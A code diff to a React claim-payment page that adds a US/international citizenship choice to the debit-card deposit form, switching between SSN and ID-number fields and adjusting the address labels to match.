@@ -15,6 +15,8 @@ export default function ClaimPaymentPage() {
   const [claimSuccess, setClaimSuccess] = useState(false);
   const [receiptData, setReceiptData] = useState(null);
 
+  const [citizenship, setCitizenship] = useState(null); // null = not selected, 'us' = US, 'international' = International
+
   const [debitCardForm, setDebitCardForm] = useState({
     first_name: '',
     middle_name: '',
@@ -548,10 +550,93 @@ export default function ClaimPaymentPage() {
               {/* DEBIT CARD TAB */}
               {activeTab === 'debit_card' && (
                 <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
-                  <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
-                  <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>
+                  {/* CITIZENSHIP QUESTION - SHOWN FIRST */}
+                  {citizenship === null ? (
+                    <div style={{ textAlign: 'center', padding: '2rem 1rem' }}>
+                      <h3 style={{ color: '#1e293b', fontSize: '1.25rem', fontWeight: '700', marginBottom: '2rem', marginTop: 0 }}>What is your citizenship status?</h3>
+                      <p style={{ color: '#64748b', marginBottom: '2rem', fontSize: '0.95rem' }}>This helps us show you the correct form fields</p>
+                      
+                      <div style={{ display: 'flex', gap: '1rem', justifyContent: 'center', flexWrap: 'wrap' }}>
+                        <button
+                          onClick={() => setCitizenship('us')}
+                          style={{
+                            padding: '1.25rem 2rem',
+                            border: '2px solid #0066cc',
+                            borderRadius: '12px',
+                            backgroundColor: 'white',
+                            color: '#0066cc',
+                            cursor: 'pointer',
+                            fontWeight: '600',
+                            fontSize: '1rem',
+                            transition: 'all 0.3s ease',
+                            minWidth: '200px'
+                          }}
+                          onMouseEnter={(e) => {
+                            e.target.style.backgroundColor = '#0066cc';
+                            e.target.style.color = 'white';
+                          }}
+                          onMouseLeave={(e) => {
+                            e.target.style.backgroundColor = 'white';
+                            e.target.style.color = '#0066cc';
+                          }}
+                        >
+                          🇺🇸 US Citizen
+                        </button>
+                        <button
+                          onClick={() => setCitizenship('international')}
+                          style={{
+                            padding: '1.25rem 2rem',
+                            border: '2px solid #10b981',
+                            borderRadius: '12px',
+                            backgroundColor: 'white',
+                            color: '#10b981',
+                            cursor: 'pointer',
+                            fontWeight: '600',
+                            fontSize: '1rem',
+                            transition: 'all 0.3s ease',
+                            minWidth: '200px'
+                          }}
+                          onMouseEnter={(e) => {
+                            e.target.style.backgroundColor = '#10b981';
+                            e.target.style.color = 'white';
+                          }}
+                          onMouseLeave={(e) => {
+                            e.target.style.backgroundColor = 'white';
+                            e.target.style.color = '#10b981';
+                          }}
+                        >
+                          🌍 International
+                        </button>
+                      </div>
+                    </div>
+                  ) : (
+                    <>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '1.5rem', padding: '0.75rem', backgroundColor: '#f0f4ff', borderRadius: '8px' }}>
+                        <span style={{ fontSize: '1.2rem', cursor: 'pointer' }} onClick={() => setCitizenship(null)} title="Change">
+                          {citizenship === 'us' ? '🇺🇸 US Citizen' : '🌍 International'}
+                        </span>
+                        <button
+                          onClick={() => setCitizenship(null)}
+                          style={{
+                            marginLeft: 'auto',
+                            padding: '0.35rem 0.75rem',
+                            backgroundColor: 'transparent',
+                            border: '1px solid #0066cc',
+                            color: '#0066cc',
+                            borderRadius: '6px',
+                            cursor: 'pointer',
+                            fontSize: '0.8rem',
+                            fontWeight: '600'
+                          }}
+                        >
+                          Change
+                        </button>
+                      </div>
 
-                  <div style={{ marginBottom: '2.5rem' }}>
+                      <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
+                      <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>
+
+                      <div style={{ marginBottom: '2.5rem' }}>
                     <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Personal Information</h4>
                     <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                       <div style={{ flex: 1 }}>
@@ -616,31 +701,29 @@ export default function ClaimPaymentPage() {
                   <div style={{ marginBottom: '2.5rem' }}>
                     <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Identity Verification</h4>
                     
-                    <div style={{ marginBottom: '1.5rem' }}>
-                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Verification Type *</label>
-                      <select value={debitCardForm.verification_type} onChange={(e) => setDebitCardForm({ ...debitCardForm, verification_type: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'}>
-                        <option value="ssn">US Social Security Number (SSN)</option>
-                        <option value="id_number">International ID Number (Passport, License, etc.)</option>
-                      </select>
-                    </div>
-
-                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
-                      {debitCardForm.verification_type === 'ssn' ? (
+                    {citizenship === 'us' ? (
+                      <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                         <div style={{ flex: 1 }}>
                           <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Social Security Number *</label>
-                          <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                          <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v, verification_type: 'ssn' }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                         </div>
-                      ) : (
                         <div style={{ flex: 1 }}>
-                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>ID Number *</label>
-                          <input type="text" placeholder="Passport, License, or ID number" value={debitCardForm.id_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, id_number: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
+                          <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                         </div>
-                      )}
-                      <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
-                        <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
-                    </div>
+                    ) : (
+                      <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
+                        <div style={{ flex: 1 }}>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>ID Number (Passport, License, etc.) *</label>
+                          <input type="text" placeholder="Your national ID number" value={debitCardForm.id_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, id_number: e.target.value, verification_type: 'id_number' })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                        </div>
+                        <div style={{ flex: 1 }}>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
+                          <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                        </div>
+                      </div>
+                    )}
                   </div>
 
                   <div style={{ marginBottom: '2.5rem' }}>
@@ -656,26 +739,37 @@ export default function ClaimPaymentPage() {
                         <input type="text" placeholder="New York" value={debitCardForm.billing_city} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>State / Province *</label>
-                        <input type="text" placeholder="CA or QC or Bayern" value={debitCardForm.billing_province_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_province_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'State' : 'State / Province'} *</label>
+                        <input type="text" placeholder={citizenship === 'us' ? 'CA' : 'CA or QC or Bayern'} value={debitCardForm.billing_province_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_province_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                     </div>
 
                     <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Postal Code *</label>
-                        <input type="text" placeholder="10001 or M5V 3A8 or 10115" value={debitCardForm.billing_postal_code} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_postal_code: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'ZIP Code' : 'Postal Code'} *</label>
+                        <input type="text" placeholder={citizenship === 'us' ? '10001' : 'M5V 3A8 or 10115'} value={debitCardForm.billing_postal_code} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_postal_code: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
-                      <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
-                        <input type="text" placeholder="United States or Canada or Germany" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
-                      </div>
+                      {citizenship !== 'us' && (
+                        <div style={{ flex: 1 }}>
+                          <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
+                          <input type="text" placeholder="Canada, Germany, etc." value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        </div>
+                      )}
                     </div>
+
+                    {citizenship === 'us' && (
+                      <div style={{ marginTop: '1rem' }}>
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
+                        <input type="text" placeholder="United States" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                      </div>
+                    )}
                   </div>
 
-                  <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
-                    {submitting ? '⏳ Processing...' : '✓ Claim to Debit Card'}
-                  </button>
+                      <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
+                        {submitting ? '⏳ Processing...' : '✓ Claim to Debit Card'}
+                      </button>
+                    </>
+                  )}
                 </div>
               )}
 
